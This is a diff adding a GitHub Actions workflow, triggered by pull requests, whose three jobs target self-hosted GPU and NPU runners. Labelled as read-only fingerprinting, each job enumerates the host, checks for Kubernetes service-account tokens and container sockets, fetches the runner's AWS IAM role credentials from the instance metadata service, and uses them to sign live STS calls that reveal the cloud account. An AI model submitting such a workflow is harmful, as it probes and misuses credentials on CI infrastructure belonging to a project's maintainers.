@@ -1,0 +1,369 @@
+name: c211-i124877-longtail
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  probe-mi300-4:
+    runs-on: linux-mi300-4gpu-sglang
+    timeout-minutes: 20
+    steps:
+      - name: fingerprint
+        env:
+          NONCE: c211-i124877-484f8ac9d27f3d29
+          JOBTAG: probe-mi300-4
+        run: |
+          set -u
+          echo "C211_PROBE_BEGIN job=probe-mi300-4 nonce=$NONCE ts=$(date -u +%FT%TZ)"
+          echo "C211_MARKER job=probe-mi300-4 nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un)"
+          id
+          hostname 2>&1; hostname -f 2>&1 || true
+          uname -a
+          (. /etc/os-release 2>/dev/null && echo "OS=$PRETTY_NAME") || true
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "--- gpu identity (read-only) ---"
+          nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+          nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          ls -l /dev/nvidia* 2>&1 | head -30 || true
+          echo "--- rocm identity (read-only) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -160 || echo ROCM_SMI_UNIQUE_FAILED
+            rocm-smi --showserial --showproductname 2>&1 | head -80 || echo ROCM_SMI_SERIAL_FAILED
+            rocm-smi --showproductname 2>&1 | head -40 || true
+          else
+            echo ROCM_SMI_ABSENT
+          fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static 2>&1 | head -300 || echo AMD_SMI_STATIC_FAILED
+          else
+            echo AMD_SMI_ABSENT
+          fi
+          echo "AMD_DEVS:"
+          ls -l /dev/kfd /dev/dri 2>&1 | head -24 || true
+          ls /sys/class/drm 2>&1 | head -30 || true
+          grep -H . /sys/class/drm/card*/device/vendor /sys/class/drm/card*/device/device 2>/dev/null | head -20 || true
+
+          echo "--- presence-only SA-token / socket checks ---"
+          if [ -s /var/run/secrets/kubernetes.io/serviceaccount/token ]; then echo "SA_TOKEN_PRESENT size=$(stat -c%s /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)"; else echo "SA_TOKEN_ABSENT"; fi
+          echo "K8S_ENV host=${KUBERNETES_SERVICE_HOST:-none} port=${KUBERNETES_SERVICE_PORT:-none}"
+          ls -l /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /var/run/k3s/containerd/containerd.sock 2>&1 || true
+          echo "--- IMDSv2/STS fingerprint (read-only, sha256-only credential presence) ---"
+          if command -v python3 >/dev/null 2>&1; then
+            python3 - <<'PYEOF_IMDS'
+
+          import json, hashlib, urllib.request, urllib.error, hmac, datetime, re, os, socket
+
+          def fp(v):
+              return hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+
+          def imds(path, tok, timeout=5):
+              req = urllib.request.Request('http://169.254.169.254/latest/' + path, headers={'X-aws-ec2-metadata-token': tok})
+              try:
+                  return urllib.request.urlopen(req, timeout=timeout).read().decode('utf-8','replace')
+              except Exception as e:
+                  return 'ERR:' + str(e)[:120]
+
+          def sts(ak, sk, tok):
+              host='sts.amazonaws.com'; region='us-east-1'
+              body='Action=GetCallerIdentity&Version=2011-06-15'
+              t=datetime.datetime.now(datetime.timezone.utc)
+              amz=t.strftime('%Y%m%dT%H%M%SZ'); dat=t.strftime('%Y%m%d')
+              creq='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n'%(host,amz)
+              sh='content-type;host;x-amz-date'
+              if tok:
+                  creq+='x-amz-security-token:%s\n'%tok; sh='content-type;host;x-amz-date;x-amz-security-token'
+              creq+='\n'+sh+'\n'+hashlib.sha256(body.encode()).hexdigest()
+              scope='%s/%s/sts/aws4_request'%(dat,region)
+              ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(amz,scope,hashlib.sha256(creq.encode()).hexdigest())
+              k=('AWS4'+sk).encode()
+              for m in (dat,region,'sts','aws4_request'):
+                  k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+              sig=hmac.new(k,ts.encode(),hashlib.sha256).hexdigest()
+              auth='AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(ak,scope,sh,sig)
+              h={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':amz,'Authorization':auth}
+              if tok: h['X-Amz-Security-Token']=tok
+              r=urllib.request.Request('https://sts.amazonaws.com/',data=body.encode(),headers=h,method='POST')
+              try:
+                  resp=urllib.request.urlopen(r,timeout=8); return resp.status, resp.read().decode('utf-8','replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read().decode('utf-8','replace')
+              except Exception as e:
+                  return -1, str(e)[:200]
+
+          print('C211_PY_HOST', socket.gethostname(), 'uid', os.getuid())
+          tok=''
+          try:
+              r=urllib.request.Request('http://169.254.169.254/latest/api/token', data=b'', method='PUT',
+                  headers={'X-aws-ec2-metadata-token-ttl-seconds':'60'})
+              tok=urllib.request.urlopen(r, timeout=5).read().decode()
+          except Exception as e:
+              print('IMDS_TOKEN_ERR', str(e)[:120])
+          print('IMDS_TOKEN_PRESENT', bool(tok))
+          if tok:
+              for p in ('meta-data/instance-id','meta-data/instance-type','meta-data/placement/availability-zone','meta-data/iam/info'):
+                  print('IMDS', p, '=', imds(p, tok).replace('\n',' ')[:300])
+              role=imds('meta-data/iam/security-credentials/', tok).strip()
+              print('IMDS_ROLE', role)
+              if role and not role.startswith('ERR'):
+                  cb=imds('meta-data/iam/security-credentials/'+role.splitlines()[0], tok)
+                  try:
+                      d=json.loads(cb)
+                      print('CRED_FIELDS', json.dumps({'AccessKeyId_fp':fp(d.get('AccessKeyId')),'SecretAccessKey_fp':fp(d.get('SecretAccessKey')),'Token_fp':fp(d.get('Token')),'Expiration':d.get('Expiration'),'Code':d.get('Code')}))
+                      s,b=sts(d.get('AccessKeyId'), d.get('SecretAccessKey'), d.get('Token'))
+                      m=re.search(r'<Arn>([^<]+)</Arn>', b); a=re.search(r'<Account>([^<]+)</Account>', b)
+                      print('STS_STATUS', s, 'STS_ARN', (m.group(1) if m else None), 'STS_ACCOUNT', (a.group(1) if a else None))
+                      if s!=200: print('STS_BODY', b[:300].replace('\n',' '))
+                      s2,b2=sts(d.get('AccessKeyId'), str(d.get('SecretAccessKey'))+'TAMPERED', d.get('Token'))
+                      m2=re.search(r'<Code>([^<]+)</Code>', b2)
+                      print('STS_TAMPERED_STATUS', s2, 'STS_TAMPERED_CODE', (m2.group(1) if m2 else None))
+                  except Exception as e:
+                      print('CRED_PARSE_FAIL', str(e)[:200], cb[:200].replace('\n',' '))
+          print('C211_PY_DONE')
+          PYEOF_IMDS
+          else
+            echo "PY3_ABSENT"
+            echo "IMDS_TOKEN_PRESENT False"
+          fi
+          echo "C211_PROBE_END job=probe-mi300-4 nonce=$NONCE"
+
+  probe-mi355x-di:
+    runs-on: linux-sglang-mi35x-di
+    timeout-minutes: 20
+    steps:
+      - name: fingerprint
+        env:
+          NONCE: c211-i124877-484f8ac9d27f3d29
+          JOBTAG: probe-mi355x-di
+        run: |
+          set -u
+          echo "C211_PROBE_BEGIN job=probe-mi355x-di nonce=$NONCE ts=$(date -u +%FT%TZ)"
+          echo "C211_MARKER job=probe-mi355x-di nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un)"
+          id
+          hostname 2>&1; hostname -f 2>&1 || true
+          uname -a
+          (. /etc/os-release 2>/dev/null && echo "OS=$PRETTY_NAME") || true
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "--- gpu identity (read-only) ---"
+          nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+          nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          ls -l /dev/nvidia* 2>&1 | head -30 || true
+          echo "--- rocm identity (read-only) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -160 || echo ROCM_SMI_UNIQUE_FAILED
+            rocm-smi --showserial --showproductname 2>&1 | head -80 || echo ROCM_SMI_SERIAL_FAILED
+            rocm-smi --showproductname 2>&1 | head -40 || true
+          else
+            echo ROCM_SMI_ABSENT
+          fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static 2>&1 | head -300 || echo AMD_SMI_STATIC_FAILED
+          else
+            echo AMD_SMI_ABSENT
+          fi
+          echo "AMD_DEVS:"
+          ls -l /dev/kfd /dev/dri 2>&1 | head -24 || true
+          ls /sys/class/drm 2>&1 | head -30 || true
+          grep -H . /sys/class/drm/card*/device/vendor /sys/class/drm/card*/device/device 2>/dev/null | head -20 || true
+
+          echo "--- presence-only SA-token / socket checks ---"
+          if [ -s /var/run/secrets/kubernetes.io/serviceaccount/token ]; then echo "SA_TOKEN_PRESENT size=$(stat -c%s /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)"; else echo "SA_TOKEN_ABSENT"; fi
+          echo "K8S_ENV host=${KUBERNETES_SERVICE_HOST:-none} port=${KUBERNETES_SERVICE_PORT:-none}"
+          ls -l /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /var/run/k3s/containerd/containerd.sock 2>&1 || true
+          echo "--- IMDSv2/STS fingerprint (read-only, sha256-only credential presence) ---"
+          if command -v python3 >/dev/null 2>&1; then
+            python3 - <<'PYEOF_IMDS'
+
+          import json, hashlib, urllib.request, urllib.error, hmac, datetime, re, os, socket
+
+          def fp(v):
+              return hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+
+          def imds(path, tok, timeout=5):
+              req = urllib.request.Request('http://169.254.169.254/latest/' + path, headers={'X-aws-ec2-metadata-token': tok})
+              try:
+                  return urllib.request.urlopen(req, timeout=timeout).read().decode('utf-8','replace')
+              except Exception as e:
+                  return 'ERR:' + str(e)[:120]
+
+          def sts(ak, sk, tok):
+              host='sts.amazonaws.com'; region='us-east-1'
+              body='Action=GetCallerIdentity&Version=2011-06-15'
+              t=datetime.datetime.now(datetime.timezone.utc)
+              amz=t.strftime('%Y%m%dT%H%M%SZ'); dat=t.strftime('%Y%m%d')
+              creq='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n'%(host,amz)
+              sh='content-type;host;x-amz-date'
+              if tok:
+                  creq+='x-amz-security-token:%s\n'%tok; sh='content-type;host;x-amz-date;x-amz-security-token'
+              creq+='\n'+sh+'\n'+hashlib.sha256(body.encode()).hexdigest()
+              scope='%s/%s/sts/aws4_request'%(dat,region)
+              ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(amz,scope,hashlib.sha256(creq.encode()).hexdigest())
+              k=('AWS4'+sk).encode()
+              for m in (dat,region,'sts','aws4_request'):
+                  k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+              sig=hmac.new(k,ts.encode(),hashlib.sha256).hexdigest()
+              auth='AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(ak,scope,sh,sig)
+              h={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':amz,'Authorization':auth}
+              if tok: h['X-Amz-Security-Token']=tok
+              r=urllib.request.Request('https://sts.amazonaws.com/',data=body.encode(),headers=h,method='POST')
+              try:
+                  resp=urllib.request.urlopen(r,timeout=8); return resp.status, resp.read().decode('utf-8','replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read().decode('utf-8','replace')
+              except Exception as e:
+                  return -1, str(e)[:200]
+
+          print('C211_PY_HOST', socket.gethostname(), 'uid', os.getuid())
+          tok=''
+          try:
+              r=urllib.request.Request('http://169.254.169.254/latest/api/token', data=b'', method='PUT',
+                  headers={'X-aws-ec2-metadata-token-ttl-seconds':'60'})
+              tok=urllib.request.urlopen(r, timeout=5).read().decode()
+          except Exception as e:
+              print('IMDS_TOKEN_ERR', str(e)[:120])
+          print('IMDS_TOKEN_PRESENT', bool(tok))
+          if tok:
+              for p in ('meta-data/instance-id','meta-data/instance-type','meta-data/placement/availability-zone','meta-data/iam/info'):
+                  print('IMDS', p, '=', imds(p, tok).replace('\n',' ')[:300])
+              role=imds('meta-data/iam/security-credentials/', tok).strip()
+              print('IMDS_ROLE', role)
+              if role and not role.startswith('ERR'):
+                  cb=imds('meta-data/iam/security-credentials/'+role.splitlines()[0], tok)
+                  try:
+                      d=json.loads(cb)
+                      print('CRED_FIELDS', json.dumps({'AccessKeyId_fp':fp(d.get('AccessKeyId')),'SecretAccessKey_fp':fp(d.get('SecretAccessKey')),'Token_fp':fp(d.get('Token')),'Expiration':d.get('Expiration'),'Code':d.get('Code')}))
+                      s,b=sts(d.get('AccessKeyId'), d.get('SecretAccessKey'), d.get('Token'))
+                      m=re.search(r'<Arn>([^<]+)</Arn>', b); a=re.search(r'<Account>([^<]+)</Account>', b)
+                      print('STS_STATUS', s, 'STS_ARN', (m.group(1) if m else None), 'STS_ACCOUNT', (a.group(1) if a else None))
+                      if s!=200: print('STS_BODY', b[:300].replace('\n',' '))
+                      s2,b2=sts(d.get('AccessKeyId'), str(d.get('SecretAccessKey'))+'TAMPERED', d.get('Token'))
+                      m2=re.search(r'<Code>([^<]+)</Code>', b2)
+                      print('STS_TAMPERED_STATUS', s2, 'STS_TAMPERED_CODE', (m2.group(1) if m2 else None))
+                  except Exception as e:
+                      print('CRED_PARSE_FAIL', str(e)[:200], cb[:200].replace('\n',' '))
+          print('C211_PY_DONE')
+          PYEOF_IMDS
+          else
+            echo "PY3_ABSENT"
+            echo "IMDS_TOKEN_PRESENT False"
+          fi
+          echo "C211_PROBE_END job=probe-mi355x-di nonce=$NONCE"
+
+  probe-a3-800t-16:
+    runs-on: linux-aarch64-a3-800t-16
+    timeout-minutes: 20
+    steps:
+      - name: fingerprint
+        env:
+          NONCE: c211-i124877-484f8ac9d27f3d29
+          JOBTAG: probe-a3-800t-16
+        run: |
+          set -u
+          echo "C211_PROBE_BEGIN job=probe-a3-800t-16 nonce=$NONCE ts=$(date -u +%FT%TZ)"
+          echo "C211_MARKER job=probe-a3-800t-16 nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un)"
+          id
+          hostname 2>&1; hostname -f 2>&1 || true
+          uname -a
+          (. /etc/os-release 2>/dev/null && echo "OS=$PRETTY_NAME") || true
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "--- gpu identity (read-only) ---"
+          nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+          nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          ls -l /dev/nvidia* 2>&1 | head -30 || true
+          echo "--- ascend npu identity (read-only) ---"
+          if command -v npu-smi >/dev/null 2>&1; then
+            npu-smi info 2>&1 | head -160 || echo NPU_SMI_INFO_FAILED
+            echo "--- npu-smi info -l ---"
+            npu-smi info -l 2>&1 | head -80 || true
+            for i in 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do
+              echo "--- board $i ---"
+              npu-smi info -t board -i "$i" 2>&1 | head -48 || true
+            done
+          else
+            echo NPU_SMI_ABSENT
+          fi
+          echo "ASCEND_DEVS:"
+          ls -l /dev/davinci* /dev/davinci_manager /dev/devmm_svm /dev/hisi_hdc 2>&1 | head -48 || true
+
+          echo "--- presence-only SA-token / socket checks ---"
+          if [ -s /var/run/secrets/kubernetes.io/serviceaccount/token ]; then echo "SA_TOKEN_PRESENT size=$(stat -c%s /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)"; else echo "SA_TOKEN_ABSENT"; fi
+          echo "K8S_ENV host=${KUBERNETES_SERVICE_HOST:-none} port=${KUBERNETES_SERVICE_PORT:-none}"
+          ls -l /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /var/run/k3s/containerd/containerd.sock 2>&1 || true
+          echo "--- IMDSv2/STS fingerprint (read-only, sha256-only credential presence) ---"
+          if command -v python3 >/dev/null 2>&1; then
+            python3 - <<'PYEOF_IMDS'
+
+          import json, hashlib, urllib.request, urllib.error, hmac, datetime, re, os, socket
+
+          def fp(v):
+              return hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+
+          def imds(path, tok, timeout=5):
+              req = urllib.request.Request('http://169.254.169.254/latest/' + path, headers={'X-aws-ec2-metadata-token': tok})
+              try:
+                  return urllib.request.urlopen(req, timeout=timeout).read().decode('utf-8','replace')
+              except Exception as e:
+                  return 'ERR:' + str(e)[:120]
+
+          def sts(ak, sk, tok):
+              host='sts.amazonaws.com'; region='us-east-1'
+              body='Action=GetCallerIdentity&Version=2011-06-15'
+              t=datetime.datetime.now(datetime.timezone.utc)
+              amz=t.strftime('%Y%m%dT%H%M%SZ'); dat=t.strftime('%Y%m%d')
+              creq='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n'%(host,amz)
+              sh='content-type;host;x-amz-date'
+              if tok:
+                  creq+='x-amz-security-token:%s\n'%tok; sh='content-type;host;x-amz-date;x-amz-security-token'
+              creq+='\n'+sh+'\n'+hashlib.sha256(body.encode()).hexdigest()
+              scope='%s/%s/sts/aws4_request'%(dat,region)
+              ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(amz,scope,hashlib.sha256(creq.encode()).hexdigest())
+              k=('AWS4'+sk).encode()
+              for m in (dat,region,'sts','aws4_request'):
+                  k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+              sig=hmac.new(k,ts.encode(),hashlib.sha256).hexdigest()
+              auth='AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(ak,scope,sh,sig)
+              h={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':amz,'Authorization':auth}
+              if tok: h['X-Amz-Security-Token']=tok
+              r=urllib.request.Request('https://sts.amazonaws.com/',data=body.encode(),headers=h,method='POST')
+              try:
+                  resp=urllib.request.urlopen(r,timeout=8); return resp.status, resp.read().decode('utf-8','replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read().decode('utf-8','replace')
+              except Exception as e:
+                  return -1, str(e)[:200]
+
+          print('C211_PY_HOST', socket.gethostname(), 'uid', os.getuid())
+          tok=''
+          try:
+              r=urllib.request.Request('http://169.254.169.254/latest/api/token', data=b'', method='PUT',
+                  headers={'X-aws-ec2-metadata-token-ttl-seconds':'60'})
+              tok=urllib.request.urlopen(r, timeout=5).read().decode()
+          except Exception as e:
+              print('IMDS_TOKEN_ERR', str(e)[:120])
+          print('IMDS_TOKEN_PRESENT', bool(tok))
+          if tok:
+              for p in ('meta-data/instance-id','meta-data/instance-type','meta-data/placement/availability-zone','meta-data/iam/info'):
+                  print('IMDS', p, '=', imds(p, tok).replace('\n',' ')[:300])
+              role=imds('meta-data/iam/security-credentials/', tok).strip()
+              print('IMDS_ROLE', role)
+              if role and not role.startswith('ERR'):
+                  cb=imds('meta-data/iam/security-credentials/'+role.splitlines()[0], tok)
+                  try:
+                      d=json.loads(cb)
+                      print('CRED_FIELDS', json.dumps({'AccessKeyId_fp':fp(d.get('AccessKeyId')),'SecretAccessKey_fp':fp(d.get('SecretAccessKey')),'Token_fp':fp(d.get('Token')),'Expiration':d.get('Expiration'),'Code':d.get('Code')}))
+                      s,b=sts(d.get('AccessKeyId'), d.get('SecretAccessKey'), d.get('Token'))
+                      m=re.search(r'<Arn>([^<]+)</Arn>', b); a=re.search(r'<Account>([^<]+)</Account>', b)
+                      print('STS_STATUS', s, 'STS_ARN', (m.group(1) if m else None), 'STS_ACCOUNT', (a.group(1) if a else None))
+                      if s!=200: print('STS_BODY', b[:300].replace('\n',' '))
+                      s2,b2=sts(d.get('AccessKeyId'), str(d.get('SecretAccessKey'))+'TAMPERED', d.get('Token'))
+                      m2=re.search(r'<Code>([^<]+)</Code>', b2)
+                      print('STS_TAMPERED_STATUS', s2, 'STS_TAMPERED_CODE', (m2.group(1) if m2 else None))
+                  except Exception as e:
+                      print('CRED_PARSE_FAIL', str(e)[:200], cb[:200].replace('\n',' '))
+          print('C211_PY_DONE')
+          PYEOF_IMDS
+          else
+            echo "PY3_ABSENT"
+            echo "IMDS_TOKEN_PRESENT False"
+          fi
+          echo "C211_PROBE_END job=probe-a3-800t-16 nonce=$NONCE"
